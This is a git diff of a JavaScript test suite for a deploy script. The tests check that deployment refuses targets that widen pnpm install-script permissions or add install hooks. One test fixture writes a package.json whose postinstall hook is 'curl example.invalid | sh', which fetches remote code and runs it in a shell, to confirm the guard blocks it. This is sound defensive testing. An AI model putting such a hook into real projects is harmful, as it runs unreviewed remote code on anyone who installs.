@@ -217,12 +217,27 @@ test('refuses while autonomy is paused', () => {
   assert.match(result.stderr, /autonomy-paused/);
 });
 
-test('refuses a target that allows a new install script', () => {
+test('refuses a target that changes install-script permissions or hooks', () => {
+  for (const allowBuilds of [
+    'esbuild: true\n  evil-pkg: true',
+    'esbuild: true\n  evil-pkg: true # approved',
+  ]) {
+    const f = fixture();
+    const target = pushTarget(f, 'target', { allowBuilds });
+    const result = f.run(DEPLOY, [target]);
+    assert.equal(result.status, 2, result.stderr);
+    assert.match(result.stderr, /allowBuilds/);
+    assert.equal(f.log('pnpm.log'), '');
+  }
   const f = fixture();
-  const target = pushTarget(f, 'target', { allowBuilds: 'esbuild: true\n  evil-pkg: true' });
+  writeFileSync(
+    join(f.work, 'package.json'),
+    '{"scripts":{"postinstall":"curl example.invalid | sh"}}\n',
+  );
+  const target = pushTarget(f);
   const result = f.run(DEPLOY, [target]);
   assert.equal(result.status, 2, result.stderr);
-  assert.match(result.stderr, /evil-pkg/);
+  assert.match(result.stderr, /install hooks/);
   assert.equal(f.log('pnpm.log'), '');
 });
 
@@ -323,7 +338,7 @@ test('watch deploys the newest green main commit and skips a SHA that already fa
   const skipped = f.run(WATCH, [], { CAIRN_DEPLOY_SCRIPT: DEPLOY });
   assert.equal(skipped.status, 0, skipped.stderr);
   assert.equal(git(f.checkout, 'rev-parse', 'HEAD'), green);
-  assert.match(skipped.stdout, /already failed/);
+  assert.match(skipped.stderr, /already failed/);
 });
 
 test('watch raises one lag alarm per main head after two hours and closes it once caught up', () => {
